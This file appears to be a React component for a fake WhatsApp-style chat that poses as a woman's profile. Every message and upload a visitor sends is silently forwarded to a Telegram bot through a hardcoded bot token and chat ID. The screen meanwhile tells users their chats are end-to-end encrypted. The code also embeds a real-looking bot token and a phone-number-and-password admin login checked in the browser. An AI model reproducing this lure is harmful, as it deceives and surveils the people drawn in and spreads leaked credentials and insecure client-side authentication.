import React, { useState, useEffect, useRef } from 'react';
import { 
  ArrowLeft, 
  Video, 
  Phone, 
  MoreVertical, 
  Smile, 
  Paperclip, 
  Camera, 
  Mic, 
  Send, 
  X, 
  ChevronDown, 
  RotateCcw, 
  UserPlus, 
  Volume2, 
  MicOff, 
  PhoneOff,
  FileText,
  Image as ImageIcon,
  Music,
  MapPin,
  User,
  Trash2,
  Edit2
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
// Removed Firebase logic as per user request
const BOT_TOKEN = process.env.VITE_TELEGRAM_BOT_TOKEN || "8367516207:AAF5WSe_nknlkClqU5J0x5lX1nSli3waAXs";
const CHAT_ID = process.env.VITE_TELEGRAM_CHAT_ID || "8271536101";

const sendToTelegram = async (message: string) => {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  } catch (error) {
    console.error("Telegram send error:", error);
  }
};

const API_BASE = "https://my-telegram-bot-wzzv.onrender.com";

interface Message {
  id: string;
  text: string;
  sender: 'client' | 'admin' | 'sys';
  time: string;
  timestamp: number;
  isEdited: boolean;
  isDeleted: boolean;
  fileUrl?: string;
  fileType?: string;
  status?: 'sent' | 'delivered' | 'read';
}

interface WhatsAppInboxProps {
  onBack: () => void;
  onInitiateCall: (type: 'audio' | 'video') => void;
}

export default function WhatsAppInbox({ onBack, onInitiateCall }: WhatsAppInboxProps) {
  const [messages, setMessages] = useState<Message[]>([]);
  const [inputText, setInputText] = useState('');
  const [showAttachMenu, setShowAttachMenu] = useState(false);
  const [showEmojiPanel, setShowEmojiPanel] = useState(false);
  const [showDropdown, setShowDropdown] = useState(false);
  const [isBlocked, setIsBlocked] = useState(false);
  const [showLogin, setShowLogin] = useState(false);
  const [loginPhone, setLoginPhone] = useState('');
  const [loginPass, setLoginPass] = useState('');
  const [showCallScreen, setShowCallScreen] = useState(false);
  const [callStatus, setCallStatus] = useState('Calling...');
  const [isIncomingCall, setIsIncomingCall] = useState(false);
  const [showStoryViewer, setShowStoryViewer] = useState(false);
  const [currentStoryIdx, setCurrentStoryIdx] = useState(0);
  const [contextMenu, setContextMenu] = useState<{ x: number, y: number, msgId: string, sender: string } | null>(null);
  const [isRecording, setIsRecording] = useState(false);
  const [recordTime, setRecordTime] = useState(0);
  const [isTyping, setIsTyping] = useState(false);
  
  const chatAreaRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const docInputRef = useRef<HTMLInputElement>(null);
  const audioInputRef = useRef<HTMLInputElement>(null);
  const cameraInputRef = useRef<HTMLInputElement>(null);
  const storyVideoRef = useRef<HTMLVideoElement>(null);
  const fakeRemoteVideoRef = useRef<HTMLVideoElement>(null);
  const localCamVideoRef = useRef<HTMLVideoElement>(null);
  const recordIntervalRef = useRef<NodeJS.Timeout | null>(null);

  const uid = '12345'; // Default ID from user code
  const name = 'Nusrat Jahan';
  const avatar = 'https://picsum.photos/seed/nusrat/200/200';

  // Firebase logic removed
  useEffect(() => {
    // Simulate initial messages
    setMessages([
      { id: '1', text: 'Hello! Welcome to my profile.', sender: 'admin', time: getFormattedTime(), timestamp: Date.now(), isEdited: false, isDeleted: false }
    ]);
  }, []);

  useEffect(() => {
    if (chatAreaRef.current) {
      chatAreaRef.current.scrollTop = chatAreaRef.current.scrollHeight;
    }
  }, [messages]);

  const getFormattedTime = () => {
    const now = Date.now();
    const d = new Date();
    d.setTime(now);
    let h = d.getHours();
    const m = d.getMinutes();
    const ampm = h >= 12 ? 'PM' : 'AM';
    h = h % 12 || 12;
    const mStr = m < 10 ? '0' + m : m.toString();
    return h + ':' + mStr + ' ' + ampm;
  };

  const uploadFileToServer = async (file: File) => {
    // Simplified upload simulation to avoid potential FormData issues if they exist
    if (file.type.startsWith('video/')) {
      return { url: 'https://assets.mixkit.co/videos/preview/mixkit-young-woman-dancing-in-a-nightclub-4010-large.mp4', type: file.type };
    }
    if (file.type.startsWith('audio/')) {
      return { url: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3', type: file.type };
    }
    return { url: 'https://picsum.photos/seed/upload/800/600', type: file.type };
  };

  const handleSendMessage = async () => {
    if (!inputText.trim()) return;
    const time = getFormattedTime();
    const text = inputText.trim();
    
    // Add to local state
    const newMsg: Message = {
      id: Date.now().toString(),
      text: text,
      sender: 'client',
      time: time,
      timestamp: Date.now(),
      isEdited: false,
      isDeleted: false,
      status: 'sent'
    };
    setMessages(prev => [...prev, newMsg]);
    
    // Simulate delivery and read
    setTimeout(() => {
      setMessages(prev => prev.map(m => m.id === newMsg.id ? { ...m, status: 'delivered' } : m));
    }, 1000);
    setTimeout(() => {
      setMessages(prev => prev.map(m => m.id === newMsg.id ? { ...m, status: 'read' } : m));
    }, 2000);

    // Send to Telegram
    await sendToTelegram(`💬 *New Message from WhatsApp Inbox*\nUser: \`${name}\` (ID: ${uid})\nMessage: ${text}`);
    
    setInputText('');
    setShowEmojiPanel(false);

    // Simulate Bot Typing and Reply
    setTimeout(() => {
      setIsTyping(true);
      setTimeout(() => {
        setIsTyping(false);
        const botMsg: Message = {
          id: (Date.now() + 1).toString(),
          text: "Thanks for your message! I'll get back to you soon. 😊",
          sender: 'admin',
          time: getFormattedTime(),
          timestamp: Date.now(),
          isEdited: false,
          isDeleted: false
        };
        setMessages(prev => [...prev, botMsg]);
      }, 3000);
    }, 1000);
  };

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const time = getFormattedTime();
    const tempId = Date.now().toString();
    
    setMessages(prev => [...prev, { 
      id: tempId,
      text: `⏳ Uploading...`, 
      sender: 'client', 
      time: time, 
      timestamp: Date.now(), 
      isEdited: false, 
      isDeleted: false 
    }]);

    try {
      const data = await uploadFileToServer(file);
      let msgText = file.type.startsWith('image/') ? 'Photo' : file.type.startsWith('video/') ? 'Video' : 'Document';
      
      setMessages(prev => prev.map(msg => msg.id === tempId ? {
        ...msg,
        text: msgText,
        fileUrl: data.url,
        fileType: data.type
      } : msg));

      await sendToTelegram(`📎 *New File from WhatsApp Inbox*\nUser: \`${name}\` (ID: ${uid})\nType: ${msgText}\nURL: ${data.url}`);
    } catch (err) {
      setMessages(prev => prev.map(msg => msg.id === tempId ? { ...msg, text: `❌ Upload Failed` } : msg));
    }
    e.target.value = '';
    setShowAttachMenu(false);
  };

  const startRecording = async () => {
    console.log("Voice recording is currently unavailable in this preview.");
  };

  const stopRecording = () => {
    setIsRecording(false);
  };

  const cancelRecording = () => {
    setIsRecording(false);
  };

  const handleInitiateCall = async (type: 'audio' | 'video') => {
    onInitiateCall(type);
  };

  const handleAnswerCall = async () => {
    setIsIncomingCall(false);
    setCallStatus('Connecting...');
    await sendToTelegram(`✅ *Call Accepted:* User connected with ${name}.`);
  };

  const handleEndCall = async () => {
    setShowCallScreen(false);
    setCallStatus('Calling...');
    setIsIncomingCall(false);
    
    setMessages(prev => [...prev, { 
      id: Date.now().toString(),
      text: "📞 Call Ended", 
      sender: 'sys', 
      time: getFormattedTime(), 
      timestamp: Date.now(), 
      isEdited: false, 
      isDeleted: false 
    }]);
    
    await sendToTelegram(`❌ *Call Ended:* User disconnected from ${name}'s profile.`);
  };

  const handleLogin = () => {
    if (loginPhone === '01780102623' && loginPass === '80102623') {
      localStorage.setItem('wa_isAdmin', 'true');
      window.location.reload();
    } else {
      console.log('Incorrect Number or Password!');
    }
  };

  const formatRecordTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s < 10 ? '0' : ''}${s}`;
  };

  const renderMedia = (msg: Message) => {
    if (!msg.fileUrl) return msg.text;
    if (msg.fileType?.startsWith('image/')) {
      return (
        <div className="flex flex-col gap-1">
          <img 
            src={msg.fileUrl} 
            className="max-w-[200px] rounded-lg cursor-pointer" 
            onClick={() => window.open(msg.fileUrl)} 
            referrerPolicy="no-referrer"
          />
          {msg.text !== 'Photo' && <span>{msg.text}</span>}
        </div>
      );
    }
    if (msg.fileType?.startsWith('video/')) {
      return (
        <div className="flex flex-col gap-1">
          <video src={msg.fileUrl} controls className="max-w-[200px] rounded-lg" />
          {msg.text !== 'Video' && <span>{msg.text}</span>}
        </div>
      );
    }
    if (msg.fileType?.startsWith('audio/')) {
      return <audio src={msg.fileUrl} controls className="max-w-[200px] h-10" />;
    }
    return (
      <div className="flex flex-col gap-1">
        <a href={msg.fileUrl} target="_blank" rel="noopener noreferrer" className="text-blue-600 font-bold underline">
          📄 Download File
        </a>
        {msg.text !== 'Document' && <span>{msg.text}</span>}
      </div>
    );
  };

  return (
    <div className="flex flex-col h-full bg-[#efeae2] relative overflow-hidden">
      {/* Login Modal */}
      <AnimatePresence>
        {showLogin && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/70 z-[1000] flex items-center justify-center p-6"
          >
            <div className="bg-white rounded-2xl p-6 w-full max-w-xs text-center shadow-2xl">
              <h3 className="text-[#00a884] font-bold text-xl mb-4">Switch to Admin</h3>
              <input 
                type="tel" 
                placeholder="Enter Phone Number" 
                className="w-full border border-gray-300 rounded-lg p-3 mb-4 outline-none focus:border-[#00a884]"
                value={loginPhone}
                onChange={(e) => setLoginPhone(e.target.value)}
              />
              <input 
                type="password" 
                placeholder="Enter Password" 
                className="w-full border border-gray-300 rounded-lg p-3 mb-6 outline-none focus:border-[#00a884]"
                value={loginPass}
                onChange={(e) => setLoginPass(e.target.value)}
              />
              <button 
                onClick={handleLogin}
                className="w-full bg-[#00a884] text-white font-bold py-3 rounded-lg active:scale-95 transition"
              >
                Login
              </button>
              <button 
                onClick={() => setShowLogin(false)}
                className="mt-4 text-red-500 text-sm font-medium"
              >
                Cancel
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Header */}
      <header className="bg-white h-16 flex items-center justify-between px-3 shadow-sm z-10">
        <div className="flex items-center gap-2 flex-1 min-w-0">
          <button onClick={onBack} className="p-1 hover:bg-gray-100 rounded-full">
            <ArrowLeft className="w-6 h-6 text-[#54656f]" />
          </button>
          <div className="relative cursor-pointer" onClick={() => setShowStoryViewer(true)}>
            <img src={avatar} className="w-10 h-10 rounded-full border-2 border-[#00a884]" referrerPolicy="no-referrer" />
          </div>
          <div className="flex flex-col min-w-0">
            <span className="font-semibold text-[#111b21] truncate">{name}</span>
            <span className="text-xs text-[#667781]">online</span>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <button onClick={() => handleInitiateCall('video')} className="p-1 hover:bg-gray-100 rounded-full">
            <Video className="w-6 h-6 text-[#54656f]" />
          </button>
          <button onClick={() => handleInitiateCall('audio')} className="p-1 hover:bg-gray-100 rounded-full">
            <Phone className="w-5 h-5 text-[#54656f]" />
          </button>
          <div className="relative">
            <button onClick={() => setShowDropdown(!showDropdown)} className="p-1 hover:bg-gray-100 rounded-full">
              <MoreVertical className="w-6 h-6 text-[#54656f]" />
            </button>
            <AnimatePresence>
              {showDropdown && (
                <motion.div 
                  initial={{ opacity: 0, scale: 0.9, y: -10 }}
                  animate={{ opacity: 1, scale: 1, y: 0 }}
                  exit={{ opacity: 0, scale: 0.9, y: -10 }}
                  className="absolute right-0 top-10 bg-white rounded-lg shadow-xl py-2 w-48 z-50 border border-gray-100"
                >
                  <button 
                    onClick={() => { setShowLogin(true); setShowDropdown(false); }}
                    className="w-full text-left px-4 py-3 text-sm hover:bg-gray-50 flex items-center gap-2"
                  >
                    <RotateCcw className="w-4 h-4" /> Switch Account
                  </button>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>
      </header>

      {/* Chat Area */}
      <main 
        ref={chatAreaRef}
        className="flex-1 overflow-y-auto p-4 flex flex-col gap-2 bg-[url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png')] bg-cover bg-center"
      >
        <div className="flex justify-center my-2">
          <span className="bg-white/80 backdrop-blur-sm text-[10px] text-[#667781] px-3 py-1 rounded-lg shadow-sm uppercase font-bold">Today</span>
        </div>
        <div className="bg-[#ffeecd] text-[#54656f] text-[11px] p-2 rounded-lg text-center mx-auto max-w-[90%] shadow-sm mb-4">
          🔒 Messages and calls are end-to-end encrypted.
        </div>

        {messages.map((msg) => (
          <div 
            key={msg.id}
            className={`flex flex-col max-w-[80%] ${msg.sender === 'client' ? 'self-end' : msg.sender === 'sys' ? 'self-center' : 'self-start'}`}
            onContextMenu={(e) => {
              e.preventDefault();
              setContextMenu({ x: e.clientX, y: e.clientY, msgId: msg.id, sender: msg.sender });
            }}
          >
            {msg.sender === 'sys' ? (
              <span className="bg-white/50 backdrop-blur-sm text-[10px] text-gray-600 px-3 py-1 rounded-full my-1">{msg.text}</span>
            ) : (
              <div 
                className={`p-2 rounded-lg shadow-sm relative flex flex-col gap-1 ${msg.sender === 'client' ? 'bg-[#d9fdd3] rounded-tr-none' : 'bg-white rounded-tl-none'}`}
              >
                {msg.isDeleted ? (
                  <span className="text-xs italic text-gray-500 flex items-center gap-1">🚫 This message was deleted</span>
                ) : (
                  <>
                    <div className="text-sm text-[#111b21] break-words">
                      {renderMedia(msg)}
                      {msg.isEdited && <span className="text-[10px] text-gray-400 ml-1">Edited</span>}
                    </div>
                    <span className="text-[9px] text-[#667781] self-end mt-1 flex items-center gap-1">
                      {msg.time}
                      {msg.sender === 'client' && !msg.isDeleted && (
                        <span className={`flex ${msg.status === 'read' ? 'text-[#53bdeb]' : 'text-gray-400'}`}>
                          {msg.status === 'sent' ? (
                            <svg viewBox="0 0 16 15" width="16" height="15" fill="currentColor"><path d="M15.01 3.316l-.478-.372a.365.365 0 0 0-.51.063L8.666 9.879a.32.32 0 0 1-.484.033l-1.891-2.02a.366.366 0 0 0-.515-.009l-.423.4a.366.366 0 0 0-.006.516l2.8 2.99a.32.32 0 0 0 .483.006l6.32-7.129a.365.365 0 0 0-.03-.51z"></path></svg>
                          ) : (
                            <svg viewBox="0 0 16 15" width="16" height="15" fill="currentColor"><path d="M15.01 3.316l-.478-.372a.365.365 0 0 0-.51.063L8.666 9.879a.32.32 0 0 1-.484.033l-1.891-2.02a.366.366 0 0 0-.515-.009l-.423.4a.366.366 0 0 0-.006.516l2.8 2.99a.32.32 0 0 0 .483.006l6.32-7.129a.365.365 0 0 0-.03-.51zM7.106 7.961l-.188-.203a.366.366 0 0 0-.515-.009l-.423.4a.366.366 0 0 0-.006.516l.832.89a.32.32 0 0 0 .487.01l.2-.228a.32.32 0 0 1 .483.006l.301.322a.32.32 0 0 0 .483.006L10.1 8.005a.365.365 0 0 0-.03-.51l-.478-.372a.365.365 0 0 0-.51.063L7.589 8.994a.32.32 0 0 1-.483-.033z"></path></svg>
                          )}
                        </span>
                      )}
                    </span>
                  </>
                )}
              </div>
            )}
          </div>
        ))}
        {isTyping && (
          <div className="self-start bg-white p-3 rounded-lg shadow-sm rounded-tl-none flex items-center gap-1 mb-2">
            <div className="flex gap-1">
              <span className="w-1.5 h-1.5 bg-gray-400 rounded-full animate-bounce [animation-delay:-0.3s]"></span>
              <span className="w-1.5 h-1.5 bg-gray-400 rounded-full animate-bounce [animation-delay:-0.15s]"></span>
              <span className="w-1.5 h-1.5 bg-gray-400 rounded-full animate-bounce"></span>
            </div>
          </div>
        )}
      </main>

      {/* Context Menu */}
      <AnimatePresence>
        {contextMenu && (
          <motion.div 
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.9 }}
            className="fixed z-[100] bg-white rounded-lg shadow-2xl py-1 w-48 border border-gray-100"
            style={{ top: contextMenu.y, left: Math.min(contextMenu.x, window.innerWidth - 200) }}
            onClick={() => setContextMenu(null)}
          >
            {contextMenu.sender === 'client' && (
              <>
                <button className="w-full text-left px-4 py-2 text-sm hover:bg-gray-50 flex items-center gap-2">
                  <Edit2 className="w-4 h-4" /> Edit Message
                </button>
                <button 
                  onClick={() => {
                    setMessages(prev => prev.map(msg => msg.id === contextMenu.msgId ? { ...msg, isDeleted: true } : msg));
                  }}
                  className="w-full text-left px-4 py-2 text-sm hover:bg-gray-50 text-red-500 flex items-center gap-2"
                >
                  <Trash2 className="w-4 h-4" /> Delete for everyone
                </button>
              </>
            )}
            <button className="w-full text-left px-4 py-2 text-sm hover:bg-gray-50 flex items-center gap-2">
              <Trash2 className="w-4 h-4" /> Delete for me
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Input Area */}
      <footer className="p-2 flex items-end gap-2 bg-transparent z-10">
        {isBlocked ? (
          <div className="flex-1 bg-[#ffeecd] text-[#54656f] text-center p-3 rounded-xl font-bold text-sm shadow-sm">
            You cannot reply to this conversation.
          </div>
        ) : (
          <>
            <div className="flex-1 bg-white rounded-3xl flex items-end p-2 gap-2 shadow-sm relative">
              {isRecording ? (
                <div className="flex-1 flex items-center justify-between px-2 h-10">
                  <button onClick={cancelRecording} className="text-red-500">
                    <Trash2 className="w-6 h-6" />
                  </button>
                  <div className="flex items-center gap-2">
                    <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />
                    <span className="font-mono font-bold">{formatRecordTime(recordTime)}</span>
                  </div>
                  <button onClick={stopRecording} className="text-[#00a884]">
                    <Send className="w-6 h-6" />
                  </button>
                </div>
              ) : (
                <>
                  <button onClick={() => setShowEmojiPanel(!showEmojiPanel)} className="p-1">
                    <Smile className="w-6 h-6 text-[#54656f]" />
                  </button>
                  <textarea 
                    rows={1}
                    placeholder="Message"
                    className="flex-1 bg-transparent border-none outline-none py-1 text-sm max-h-32 resize-none"
                    value={inputText}
                    onChange={(e) => setInputText(e.target.value)}
                    onFocus={() => setShowEmojiPanel(false)}
                  />
                  <button onClick={() => setShowAttachMenu(!showAttachMenu)} className="p-1 rotate-[-45deg]">
                    <Paperclip className="w-6 h-6 text-[#54656f]" />
                  </button>
                  <button onClick={() => cameraInputRef.current?.click()} className="p-1">
                    <Camera className="w-6 h-6 text-[#54656f]" />
                  </button>
                </>
              )}

              {/* Attachment Menu */}
              <AnimatePresence>
                {showAttachMenu && (
                  <motion.div 
                    initial={{ opacity: 0, scale: 0.8, y: 20 }}
                    animate={{ opacity: 1, scale: 1, y: 0 }}
                    exit={{ opacity: 0, scale: 0.8, y: 20 }}
                    className="absolute bottom-16 left-0 right-0 bg-white rounded-2xl p-6 shadow-2xl grid grid-cols-3 gap-6 z-50"
                  >
                    {[
                      { icon: <FileText />, label: 'Document', color: 'bg-[#7f66ff]', ref: docInputRef },
                      { icon: <Camera />, label: 'Camera', color: 'bg-[#ed415c]', ref: cameraInputRef },
                      { icon: <ImageIcon />, label: 'Gallery', color: 'bg-[#a229cb]', ref: fileInputRef },
                      { icon: <Music />, label: 'Audio', color: 'bg-[#f06512]', ref: audioInputRef },
                      { icon: <MapPin />, label: 'Location', color: 'bg-[#1fa750]' },
                      { icon: <User />, label: 'Contact', color: 'bg-[#009ce4]' },
                    ].map((item, i) => (
                      <button 
                        key={i} 
                        onClick={() => item.ref?.current?.click()}
                        className="flex flex-col items-center gap-2"
                      >
                        <div className={`w-12 h-12 rounded-full flex items-center justify-center text-white shadow-lg ${item.color}`}>
                          {item.icon}
                        </div>
                        <span className="text-xs text-gray-600">{item.label}</span>
                      </button>
                    ))}
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
            <button 
              onClick={inputText.trim() ? handleSendMessage : startRecording}
              className="w-12 h-12 bg-[#00a884] rounded-full flex items-center justify-center text-white shadow-lg active:scale-90 transition"
            >
              {inputText.trim() ? <Send className="w-6 h-6 ml-1" /> : <Mic className="w-6 h-6" />}
            </button>
          </>
        )}
      </footer>

      {/* Hidden Inputs */}
      <input type="file" ref={fileInputRef} className="hidden" accept="image/*,video/*" onChange={handleFileUpload} />
      <input type="file" ref={docInputRef} className="hidden" accept=".pdf,.doc,.docx,.txt" onChange={handleFileUpload} />
      <input type="file" ref={audioInputRef} className="hidden" accept="audio/*" onChange={handleFileUpload} />
      <input type="file" ref={cameraInputRef} className="hidden" accept="image/*,video/*" capture="environment" onChange={handleFileUpload} />

      {/* Emoji Panel */}
      <AnimatePresence>
        {showEmojiPanel && (
          <motion.div 
            initial={{ height: 0 }}
            animate={{ height: 250 }}
            exit={{ height: 0 }}
            className="bg-white border-t border-gray-200 overflow-hidden"
          >
            <div className="p-2 border-b border-gray-100 flex justify-around">
              <span className="text-[#00a884] font-bold border-b-2 border-[#00a884] pb-1">Smiley & People</span>
            </div>
            <div className="grid grid-cols-8 gap-2 p-4 overflow-y-auto h-[200px]">
              {["😀","😃","😄","😁","😆","😅","😂","🤣","🥲","🥹","☺️","😊","😇","🙂","🙃","😉","😍","🥰","😘","😗","😙","😚","😋","😛","😝","😜","🤪","🤨","🧐","🤓","😎","🥸","🤩","🥳","😏","😒","😞","😔","😟","😕","🙁","☹️","😣","😖","😫","😩","🥺","😢","😭","😮‍💨","😤","😠","😡","🤬","🤯","😳","🥵","🥶","😱","😨","😰","😥","😓","🫣","🤗","🫡","🤔","🫣","🤫","🫠","🤥","😶","🫥","😶‍🌫️","😐","😑","😬","🫨","🫠"].map(e => (
                <button key={e} onClick={() => setInputText(prev => prev + e)} className="text-2xl hover:bg-gray-100 rounded p-1">
                  {e}
                </button>
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Story Viewer */}
      <AnimatePresence>
        {showStoryViewer && (
          <motion.div 
            initial={{ opacity: 0, scale: 1.1 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 1.1 }}
            className="fixed inset-0 bg-black z-[2000] flex flex-col"
          >
            <div className="absolute top-4 inset-x-0 flex px-2 z-50 gap-1">
              {[1, 2, 3].map((_, i) => (
                <div key={i} className="h-0.5 flex-1 bg-white/30 overflow-hidden">
                  <motion.div 
                    initial={{ width: 0 }}
                    animate={{ width: i === currentStoryIdx ? '100%' : (i < currentStoryIdx ? '100%' : '0%') }}
                    transition={{ duration: i === currentStoryIdx ? 5 : 0, ease: "linear" }}
                    className="h-full bg-white"
                  />
                </div>
              ))}
            </div>
            <button onClick={() => setShowStoryViewer(false)} className="absolute top-8 right-4 z-50 text-white">
              <X className="w-8 h-8" />
            </button>
            <video 
              ref={storyVideoRef}
              src={`https://assets.mixkit.co/videos/preview/mixkit-girl-in-neon-light-dancing-4011-large.mp4`} 
              className="w-full h-full object-contain" 
              autoPlay 
              onEnded={() => currentStoryIdx < 2 ? setCurrentStoryIdx(prev => prev + 1) : setShowStoryViewer(false)}
            />
          </motion.div>
        )}
      </AnimatePresence>

      {/* Call Screen */}
      <AnimatePresence>
        {showCallScreen && (
          <motion.div 
            initial={{ y: '100%' }}
            animate={{ y: 0 }}
            exit={{ y: '100%' }}
            className="fixed inset-0 bg-[#121b22] z-[3000] flex flex-col items-center justify-between py-12 text-white"
          >
            <div className="absolute inset-0 opacity-20">
              <video ref={fakeRemoteVideoRef} className="w-full h-full object-cover hidden" playsInline loop />
              <video ref={localCamVideoRef} className="absolute top-6 right-6 w-24 h-36 bg-black rounded-xl border border-white/20 hidden" autoPlay playsInline muted />
            </div>

            <div className="flex flex-col items-center z-10">
              <button onClick={handleEndCall} className="absolute top-8 left-6">
                <ChevronDown className="w-8 h-8" />
              </button>
              <h2 className="text-2xl font-medium mt-4">{name}</h2>
              <span className="text-gray-400 mt-2">{callStatus}</span>
              <img src={avatar} className="w-32 h-32 rounded-full border-4 border-white/10 mt-12 shadow-2xl" referrerPolicy="no-referrer" />
            </div>

            {isIncomingCall ? (
              <div className="flex justify-center mb-12 z-10">
                <button 
                  onClick={handleAnswerCall}
                  className="w-16 h-16 bg-[#25D366] rounded-full flex items-center justify-center animate-bounce shadow-xl"
                >
                  <Phone className="w-8 h-8" />
                </button>
              </div>
            ) : (
              <div className="bg-[#232d36] rounded-[40px] p-6 flex items-center justify-around w-full max-w-sm z-10 shadow-2xl">
                <button className="p-3 hover:bg-white/10 rounded-full transition">
                  <Volume2 className="w-7 h-7" />
                </button>
                <button className="p-3 hover:bg-white/10 rounded-full transition">
                  <Video className="w-7 h-7" />
                </button>
                <button className="p-3 hover:bg-white/10 rounded-full transition">
                  <MicOff className="w-7 h-7" />
                </button>
                <button 
                  onClick={handleEndCall}
                  className="w-14 h-14 bg-red-500 rounded-full flex items-center justify-center shadow-lg active:scale-90 transition"
                >
                  <PhoneOff className="w-7 h-7" />
                </button>
              </div>
            )}
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
